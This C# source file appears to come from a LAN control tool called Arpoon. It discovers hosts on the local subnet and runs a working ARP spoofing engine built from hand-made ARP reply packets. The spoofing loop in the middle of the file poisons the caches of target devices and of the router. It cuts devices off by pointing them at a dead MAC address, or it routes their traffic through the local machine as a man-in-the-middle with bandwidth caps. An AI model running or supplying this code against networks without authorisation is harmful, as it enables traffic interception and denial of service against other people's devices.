using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using Arpoon.Throttling;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Arpoon
{
    public class CArp : IDisposable
    {
        private volatile bool _isListeningArp;
        private volatile bool _isSpoofing;
        private volatile bool _isDiscovering;

        private readonly object _pcapSendLock = new();
        private readonly HashSet<IPAddress> _activeSpoofedIps = new();

        // Tracks the cap (KB/s, 0 = none) last actually pushed to the throttler
        // for each IP, so SpoofLoop only calls into it on a real transition
        // instead of reissuing the same tc/dnctl shell-out every ~2s cycle.
        // Only ever touched by the single spoofing thread, so no lock needed.
        private readonly Dictionary<IPAddress, int> _lastAppliedCapKb = new();
        private IBandwidthThrottler _bandwidthThrottler;

        public IBandwidthThrottler BandwidthThrottler => _bandwidthThrottler;

        private PcList _pcList;
        private LibPcapLiveDevice _device;

        private Thread _arpListenerThread;
        private Thread _spoofingThread;
        private Thread _discoveringThread;

        public byte[] LocalIp;
        public byte[] LocalMac;
        public byte[] RouterIp;
        public byte[] RouterMac;
        public byte[] BroadcastMac;

        /// <summary>Subnet mask detected from the interface (null if undetermined).</summary>
        public byte[] SubnetMask;

        /// <summary>Indicates whether the gateway was inferred (fallback) instead of detected.</summary>
        public bool IsGatewayInferred { get; private set; }

        /// <summary>Triggered when the underlying physical interface is disconnected or drops connectivity.</summary>
        public event Action<string> OnInterfaceDisconnected;

        private long _lastNetworkChangeTimestamp = 0;

        public CArp(LibPcapLiveDevice nic, PcList pcList)
        {
            _pcList = pcList;
            _device = nic;

            if (!_device.Opened)
            {
                _device.Open(DeviceModes.Promiscuous, 1000);
            }

            LocalMac = _device.MacAddress.GetAddressBytes();

            // Detect IPv4 gateway
            foreach (var addr in _device.Interface.GatewayAddresses)
            {
                if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    RouterIp = addr.GetAddressBytes();
                    break;
                }
            }

            // Detect local IP and subnet mask
            foreach (var addr in _device.Addresses)
            {
                if (addr.Addr.ipAddress != null &&
                    addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    LocalIp = addr.Addr.ipAddress.GetAddressBytes();

                    if (addr.Netmask.ipAddress != null)
                    {
                        SubnetMask = addr.Netmask.ipAddress.GetAddressBytes();
                    }
                    break;
                }
            }

            // Fallback: assume /24 if mask not detected
            if (SubnetMask == null)
            {
                SubnetMask = new byte[] { 255, 255, 255, 0 };
                Logger.Write("[WARN] Subnet mask not detected, defaulting to /24.");
            }

            // Fallback: infer gateway as first host in range if not detected
            if (RouterIp == null && LocalIp != null)
            {
                byte[] networkAddr = GetNetworkAddress(LocalIp, SubnetMask);
                byte[] inferred = new byte[4];
                Array.Copy(networkAddr, inferred, 4);
                IncrementIP(inferred);
                RouterIp = inferred;
                IsGatewayInferred = true;
                Logger.Write($"[WARN] Gateway not detected, inferred as {new IPAddress(RouterIp)}");
            }

            BroadcastMac = new byte[] { 255, 255, 255, 255, 255, 255 };

            // Explicitly register local PC in device list (IsLocalPc = true)
            if (LocalIp != null && LocalMac != null)
            {
                PC localPc = new PC
                {
                    Ip = new IPAddress(LocalIp),
                    Mac = new PhysicalAddress(LocalMac),
                    IsLocalPc = true,
                    Name = Environment.MachineName,
                    Hostname = Environment.MachineName,
                    DeviceCategory = DeviceType.Desktop,
                    Vendor = OuiDatabase.Lookup(LocalMac) ?? "Local Host"
                };
                _pcList.AddDevice(localPc);
            }

            // Initialize cross-platform bandwidth throttler
            try
            {
                string ifaceName = _device.Interface?.Name ?? string.Empty;
                _bandwidthThrottler = BandwidthThrottlerFactory.Create(ifaceName);
            }
            catch (Exception ex)
            {
                Logger.Write($"[THROTTLE INIT ERROR] {ex.Message}");
            }

            // Observe per-device bandwidth limit and redirect updates
            _pcList.SetOnDeviceAdded(OnDeviceAddedForThrottling);

            // Subscribe to network interface state changes
            try
            {
                NetworkChange.NetworkAvailabilityChanged += OnNetworkAvailabilityChanged;
                NetworkChange.NetworkAddressChanged += OnNetworkAddressChanged;
            }
            catch (Exception ex)
            {
                Logger.Write($"[NETWORK CHANGE INIT ERROR] {ex.Message}");
            }
        }

        private void OnDeviceAddedForThrottling(PC pc)
        {
            if (pc == null) return;
            pc.PropertyChanged += (s, e) =>
            {
                if (e.PropertyName == nameof(PC.BandwidthLimitKb) ||
                    e.PropertyName == nameof(PC.Redirect) ||
                    e.PropertyName == nameof(PC.Block))
                {
                    if (s is PC target)
                    {
                        UpdateDeviceBandwidthLimit(target);
                    }
                }
            };
        }

        public void UpdateDeviceBandwidthLimit(PC target)
        {
            if (_bandwidthThrottler == null || target == null || target.Ip == null) return;

            if (_isSpoofing && target.Redirect && target.CanControl)
            {
                if (target.BandwidthLimitKb > 0)
                {
                    _bandwidthThrottler.SetLimit(target.Ip, target.BandwidthLimitKb);
                }
                else
                {
                    _bandwidthThrottler.RemoveLimit(target.Ip);
                }
            }
            else
            {
                _bandwidthThrottler.RemoveLimit(target.Ip);
            }
        }

        /// <summary>
        /// Sends a raw packet serialized under _pcapSendLock to ensure thread-safety on LibPcapLiveDevice.
        /// </summary>
        public void SendPacketLocked(byte[] packet)
        {
            if (packet == null || _device == null || !_device.Opened) return;
            lock (_pcapSendLock)
            {
                try
                {
                    _device.SendPacket(packet);
                }
                catch (Exception ex)
                {
                    Logger.Write($"[PCAP SEND ERROR] {ex.Message}");
                }
            }
        }

        // ──────────────────────────────────────────────
        //  ARP Listener
        // ──────────────────────────────────────────────

        public void StartArpListener()
        {
            if (!_isListeningArp)
            {
                _isListeningArp = true;
                _arpListenerThread = new Thread(ArpListenerLoop) { IsBackground = true };
                _arpListenerThread.Start();
            }
        }

        public void StopArpListener()
        {
            if (_isListeningArp)
            {
                _isListeningArp = false;
                _arpListenerThread?.Join(TimeSpan.FromSeconds(3));
                _arpListenerThread = null;
                Logger.Write("[INFO] ARP Listener stopped.");
            }
        }

        private void ArpListenerLoop()
        {
            try
            {
                _device.Filter = "arp";
                while (_isListeningArp)
                {
                    PacketCapture pCapture;
                    var status = _device.GetNextPacket(out pCapture);
                    if (status != GetPacketStatus.PacketRead) continue;

                    var rawPacket = pCapture.GetPacket()?.Data;
                    if (rawPacket == null || rawPacket.Length < 42) continue;

                    byte[] srcMac = new byte[6];
                    Array.Copy(rawPacket, 6, srcMac, 0, 6);
                    if (Tools.AreValuesEqual(srcMac, LocalMac)) continue;

                    // Learn from both ARP Request (1) and ARP Reply (2)
                    if (rawPacket[21] == 1 || rawPacket[21] == 2)
                    {
                        byte[] senderIp = new byte[4];
                        byte[] senderMac = new byte[6];
                        Array.Copy(rawPacket, 22, senderMac, 0, 6);
                        Array.Copy(rawPacket, 28, senderIp, 0, 4);

                        bool isGateway = Tools.AreValuesEqual(senderIp, RouterIp);
                        if (isGateway && (RouterMac == null || !Tools.AreValuesEqual(RouterMac, senderMac)))
                        {
                            RouterMac = senderMac;
                        }

                        bool isLocal = Tools.AreValuesEqual(senderIp, LocalIp);

                        PC newPc = new PC
                        {
                            Ip = new IPAddress(senderIp),
                            Mac = new PhysicalAddress(senderMac),
                            IsGateway = isGateway,
                            IsLocalPc = isLocal
                        };

                        if (_pcList.AddDevice(newPc))
                        {
                            Logger.Write($"[DETECTED] IP: {newPc.Ip} MAC: {newPc.Mac} {(isGateway ? "(Gateway)" : "")}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                if (_isListeningArp)
                {
                    Logger.Write($"[ARP LISTENER ERROR] {ex.Message}");
                }
            }
        }

        // ──────────────────────────────────────────────
        //  ARP Discovery (Subnet-aware)
        // ──────────────────────────────────────────────

        public void StartArpDiscovery()
        {
            if (!_isDiscovering)
            {
                _isDiscovering = true;
                _discoveringThread = new Thread(DiscoveryLoop) { IsBackground = true };
                _discoveringThread.Start();
            }
        }

        public void StopDiscovery()
        {
            if (_isDiscovering)
            {
                _isDiscovering = false;
                _discoveringThread?.Join(TimeSpan.FromSeconds(3));
                _discoveringThread = null;
                Logger.Write("[INFO] Discovery stopped.");
            }
        }

        private void DiscoveryLoop()
        {
            try
            {
                // Discover gateway first (3 attempts)
                if (RouterIp != null)
                {
                    for (int k = 0; k < 3 && _isDiscovering; k++)
                    {
                        SendArpRequest(new IPAddress(RouterIp));
                        Thread.Sleep(50);
                    }
                }

                // Calculate network range based on real subnet mask
                byte[] networkAddr = GetNetworkAddress(LocalIp, SubnetMask);
                byte[] broadcastAddr = GetBroadcastAddress(LocalIp, SubnetMask);
                uint networkUint = BytesToUint(networkAddr);
                uint broadcastUint = BytesToUint(broadcastAddr);

                uint totalHosts = broadcastUint > networkUint ? broadcastUint - networkUint - 1 : 0;
                uint maxHosts = Math.Min(totalHosts, 1024);

                Logger.Write($"[DISCOVERY] Network: {new IPAddress(networkAddr)} " +
                                  $"Broadcast: {new IPAddress(broadcastAddr)} " +
                                  $"Hosts to scan: {maxHosts}/{totalHosts}");

                for (uint offset = 1; offset <= maxHosts && _isDiscovering; offset++)
                {
                    uint targetUint = networkUint + offset;
                    byte[] targetBytes = UintToBytes(targetUint);

                    if (Tools.AreValuesEqual(targetBytes, LocalIp)) continue;
                    if (RouterIp != null && Tools.AreValuesEqual(targetBytes, RouterIp)) continue;

                    IPAddress target = new IPAddress(targetBytes);
                    SendArpRequest(target);
                    Thread.Sleep(5);

                    // Re-probe the gateway periodically through the whole sweep
                    // (not just the 3 shots up front) until it actually answers —
                    // a single reply can be lost to Wi-Fi retransmission/latency,
                    // which otherwise leaves the router permanently untagged.
                    if (RouterIp != null && RouterMac == null && offset % 40 == 0)
                    {
                        SendArpRequest(new IPAddress(RouterIp));
                    }
                }

                // Keep retrying for a few seconds after the sweep if the
                // gateway still hasn't answered.
                for (int k = 0; k < 10 && _isDiscovering && RouterIp != null && RouterMac == null; k++)
                {
                    SendArpRequest(new IPAddress(RouterIp));
                    Thread.Sleep(300);
                }
            }
            catch (Exception ex)
            {
                if (_isDiscovering)
                {
                    Logger.Write($"[DISCOVERY ERROR] {ex.Message}");
                }
            }
            finally
            {
                _isDiscovering = false;
            }
        }

        // ──────────────────────────────────────────────
        //  ARP Spoofing
        // ──────────────────────────────────────────────

        public void StartSpoofing()
        {
            if (!_isSpoofing)
            {
                if (RouterMac == null)
                {
                    Logger.Write("[ERROR] Router MAC not found.");
                    return;
                }
                _isSpoofing = true;
                _spoofingThread = new Thread(SpoofLoop) { IsBackground = true };
                _spoofingThread.Start();
                Logger.Write(">>> ARP SPOOF STARTED <<<");
            }
        }

        public void StopSpoofing()
        {
            if (_isSpoofing)
            {
                _isSpoofing = false;
                _spoofingThread?.Join(TimeSpan.FromSeconds(5));
                _spoofingThread = null;
                _bandwidthThrottler?.ResetAll();
                Logger.Write(">>> ARP SPOOF STOPPED <<<");
            }
        }

        private void SpoofLoop()
        {
            // Dead MAC used to block devices — packets sent here go nowhere
            byte[] deadMac = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };

            try
            {
                while (_isSpoofing)
                {
                    IReadOnlyList<PC> snapshot = _pcList.Devices;
                    HashSet<IPAddress> currentSpoofedThisCycle = new();

                    for (int i = 0; i < snapshot.Count; i++)
                    {
                        if (!_isSpoofing) break;
                        PC target = snapshot[i];

                        if (target.IsLocalPc || target.IsGateway || target.IsWhitelisted || target.Mac == null || target.Ip == null) continue;

                        if (target.Block)
                        {
                            currentSpoofedThisCycle.Add(target.Ip);
                            if (!_lastAppliedCapKb.TryGetValue(target.Ip, out int appliedBlockKb) || appliedBlockKb != 0)
                            {
                                _bandwidthThrottler?.RemoveLimit(target.Ip);
                                _lastAppliedCapKb[target.Ip] = 0;
                            }

                            // BLOCK: Tell the device the gateway is at a dead MAC
                            SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
                                        deadMac, RouterIp);
                            // Also tell the router this device is at a dead MAC
                            SendArpReply(RouterMac, RouterIp,
                                        deadMac, target.Ip.GetAddressBytes());
                        }
                        else if (target.Redirect)
                        {
                            currentSpoofedThisCycle.Add(target.Ip);

                            // The reactive PropertyChanged path (UpdateDeviceBandwidthLimit)
                            // already pushes a cap the instant the user changes it while
                            // spoofing is active. This periodic pass only needs to (a) catch
                            // up a cap that was set before spoofing started, and (b) re-assert
                            // it if something external reset the throttler -- not reissue the
                            // same tc/dnctl command set every single cycle regardless.
                            int desiredKb = target.BandwidthLimitKb;
                            if (!_lastAppliedCapKb.TryGetValue(target.Ip, out int appliedKb) || appliedKb != desiredKb)
                            {
                                if (desiredKb > 0)
                                {
                                    _bandwidthThrottler?.SetLimit(target.Ip, desiredKb);
                                }
                                else
                                {
                                    _bandwidthThrottler?.RemoveLimit(target.Ip);
                                }
                                _lastAppliedCapKb[target.Ip] = desiredKb;
                            }

                            // REDIRECT: Route traffic through us (MITM)
                            SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
                                        LocalMac, RouterIp);
                            SendArpReply(RouterMac, RouterIp,
                                        LocalMac, target.Ip.GetAddressBytes());
                        }
                    }

                    // Check for devices that had Block/Redirect unchecked and restore them immediately
                    lock (_activeSpoofedIps)
                    {
                        foreach (var prevIp in _activeSpoofedIps)
                        {
                            if (!currentSpoofedThisCycle.Contains(prevIp))
                            {
                                _bandwidthThrottler?.RemoveLimit(prevIp);
                                _lastAppliedCapKb.Remove(prevIp);
                                PC unpoisonTarget = _pcList.GetDeviceByIp(prevIp);
                                if (unpoisonTarget != null)
                                {
                                    SendRestoreForDevice(unpoisonTarget);
                                }
                            }
                        }
                        _activeSpoofedIps.Clear();
                        foreach (var ip in currentSpoofedThisCycle)
                        {
                            _activeSpoofedIps.Add(ip);
                        }
                    }

                    // Sleep cooperatively in short slices for fast shutdown
                    for (int s = 0; s < 20 && _isSpoofing; s++)
                    {
                        Thread.Sleep(100);
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Write($"[SPOOF ERROR] {ex.Message}");
            }
            finally
            {
                RestoreArpTables();
            }
        }

        /// <summary>
        /// Sends immediate ARP replies to restore the real gateway and device MAC for an unpoisoned device.
        /// </summary>
        public void SendRestoreForDevice(PC target)
        {
            if (target == null || target.Mac == null || target.Ip == null || RouterMac == null || RouterIp == null) return;
            byte[] targetMac = target.Mac.GetAddressBytes();
            byte[] targetIp = target.Ip.GetAddressBytes();

            for (int k = 0; k < 3; k++)
            {
                SendArpReply(targetMac, targetIp, RouterMac, RouterIp);
                SendArpReply(RouterMac, RouterIp, targetMac, targetIp);
            }
            Logger.Write($"[RESTORED] Instant ARP restore sent for {target.Ip} ({target.Mac})");
        }

        /// <summary>
        /// Sends correct ARP replies to restore the real gateway MAC on all devices.
        /// Called when spoofing stops to cleanly restore the network.
        /// </summary>
        private void RestoreArpTables()
        {
            if (RouterMac == null || RouterIp == null) return;

            IReadOnlyList<PC> snapshot = _pcList.Devices;
            for (int attempt = 0; attempt < 3; attempt++)
            {
                foreach (PC target in snapshot)
                {
                    if (target.IsLocalPc || target.IsGateway || target.Mac == null || target.Ip == null) continue;

                    // Tell device the real gateway MAC
                    SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
                                RouterMac, RouterIp);
                    // Tell router the real device MAC
                    SendArpReply(RouterMac, RouterIp,
                                target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes());
                }
                Thread.Sleep(100);
            }

            lock (_activeSpoofedIps)
            {
                _activeSpoofedIps.Clear();
            }
            _lastAppliedCapKb.Clear();

            _bandwidthThrottler?.ResetAll();
            Logger.Write("[INFO] ARP tables and bandwidth limits restored.");
        }

        // ──────────────────────────────────────────────
        //  ARP Packet Construction
        // ──────────────────────────────────────────────

        public void SendArpRequest(IPAddress targetIp)
        {
            if (targetIp == null || LocalMac == null || LocalIp == null) return;
            byte[] packet = BuildArpPacket(
                BroadcastMac, LocalMac, 1,
                LocalMac, LocalIp,
                new byte[6], targetIp.GetAddressBytes()
            );
            SendPacketLocked(packet);
        }

        public void SendArpReply(byte[] destMac, byte[] destIp, byte[] srcMac, byte[] srcIp)
        {
            if (destMac == null || destIp == null || srcMac == null || srcIp == null || LocalMac == null) return;
            byte[] packet = BuildArpPacket(
                destMac, LocalMac, 2,
                srcMac, srcIp,
                destMac, destIp
            );
            SendPacketLocked(packet);
        }

        public byte[] BuildArpPacket(byte[] destMac, byte[] srcMac, short arpType,
            byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIp)
        {
            byte[] packet = new byte[42];
            Array.Copy(destMac, 0, packet, 0, 6);
            Array.Copy(srcMac, 0, packet, 6, 6);
            packet[12] = 8; packet[13] = 6;    // EtherType: ARP
            packet[14] = 0; packet[15] = 1;    // Hardware: Ethernet
            packet[16] = 8; packet[17] = 0;    // Protocol: IPv4
            packet[18] = 6; packet[19] = 4;    // HW size: 6, Proto size: 4
            packet[20] = 0; packet[21] = (byte)arpType;
            Array.Copy(arpSrcMac, 0, packet, 22, 6);
            Array.Copy(arpSrcIp, 0, packet, 28, 4);
            Array.Copy(arpDestMac, 0, packet, 32, 6);
            Array.Copy(arpDestIp, 0, packet, 38, 4);
            return packet;
        }

        // ──────────────────────────────────────────────
        //  Subnet Utilities (Cross-platform)
        // ──────────────────────────────────────────────

        /// <summary>Calculates network address: IP AND Mask.</summary>
        public static byte[] GetNetworkAddress(byte[] ip, byte[] mask)
        {
            byte[] result = new byte[4];
            for (int i = 0; i < 4; i++)
                result[i] = (byte)(ip[i] & mask[i]);
            return result;
        }

        /// <summary>Calculates broadcast address: IP OR ~Mask.</summary>
        public static byte[] GetBroadcastAddress(byte[] ip, byte[] mask)
        {
            byte[] result = new byte[4];
            for (int i = 0; i < 4; i++)
                result[i] = (byte)(ip[i] | ~mask[i]);
            return result;
        }

        private static uint BytesToUint(byte[] bytes)
        {
            return (uint)(bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3]);
        }

        private static byte[] UintToBytes(uint value)
        {
            return new byte[]
            {
                (byte)(value >> 24),
                (byte)(value >> 16),
                (byte)(value >> 8),
                (byte)value
            };
        }

        private static void IncrementIP(byte[] ip)
        {
            for (int i = 3; i >= 0; i--)
            {
                if (ip[i] < 255) { ip[i]++; return; }
                ip[i] = 0;
            }
        }

        public void ClearDeviceList()
        {
            _pcList?.Clear();
        }

        /// <summary>
        /// Halts all active engine threads (discovery, spoofing, traffic monitoring, and listener) cleanly.
        /// </summary>
        public void StopAll()
        {
            StopDiscovery();
            StopSpoofing();
            StopArpListener();
        }

        private void OnNetworkAvailabilityChanged(object sender, NetworkAvailabilityEventArgs e)
        {
            if (!e.IsAvailable)
            {
                HandleNetworkInterruption("Network connection lost (availability down).");
            }
        }

        private void OnNetworkAddressChanged(object sender, EventArgs e)
        {
            // Debounce: ignore events fired within 500ms of each other
            long now = Stopwatch.GetTimestamp();
            double elapsedMs = (now - Interlocked.Read(ref _lastNetworkChangeTimestamp)) * 1000.0 / Stopwatch.Frequency;
            if (elapsedMs < 500)
            {
                return;
            }
            Interlocked.Exchange(ref _lastNetworkChangeTimestamp, now);

            bool isDeviceStillActive = false;
            try
            {
                var interfaces = NetworkInterface.GetAllNetworkInterfaces();
                foreach (var nic in interfaces)
                {
                    if (nic.Name == _device?.Name || nic.Description == _device?.Description)
                    {
                        if (nic.OperationalStatus == OperationalStatus.Up)
                        {
                            var ipProps = nic.GetIPProperties();
                            foreach (var uni in ipProps.UnicastAddresses)
                            {
                                if (uni.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                                {
                                    isDeviceStillActive = true;
                                    break;
                                }
                            }
                        }
                        break;
                    }
                }
            }
            catch
            {
                isDeviceStillActive = true;
            }

            if (!isDeviceStillActive)
            {
                HandleNetworkInterruption("Monitored interface disconnected or IPv4 address revoked.");
            }
        }

        private void HandleNetworkInterruption(string reason)
        {
            try
            {
                Logger.Write($"[NETWORK RESILIENCE] {reason}");
                StopAll();
                OnInterfaceDisconnected?.Invoke(reason);
            }
            catch (Exception ex)
            {
                Logger.Write($"[NETWORK RESILIENCE ERROR] {ex.Message}");
            }
        }

        public void Dispose()
        {
            try
            {
                NetworkChange.NetworkAvailabilityChanged -= OnNetworkAvailabilityChanged;
                NetworkChange.NetworkAddressChanged -= OnNetworkAddressChanged;
            }
            catch { }

            _isListeningArp = false;
            _isDiscovering = false;
            _isSpoofing = false;

            _arpListenerThread?.Join(TimeSpan.FromSeconds(3));
            _discoveringThread?.Join(TimeSpan.FromSeconds(3));
            _spoofingThread?.Join(TimeSpan.FromSeconds(5));

            _arpListenerThread = null;
            _discoveringThread = null;
            _spoofingThread = null;

            try
            {
                _bandwidthThrottler?.Dispose();
                _bandwidthThrottler = null;
            }
            catch (Exception ex)
            {
                Logger.Write($"[DISPOSE] Error disposing throttler: {ex.Message}");
            }

            try
            {
                if (_device != null && _device.Opened) _device.Close();
            }
            catch (Exception ex)
            {
                Logger.Write($"[DISPOSE] Error closing device: {ex.Message}");
            }
        }
    }
}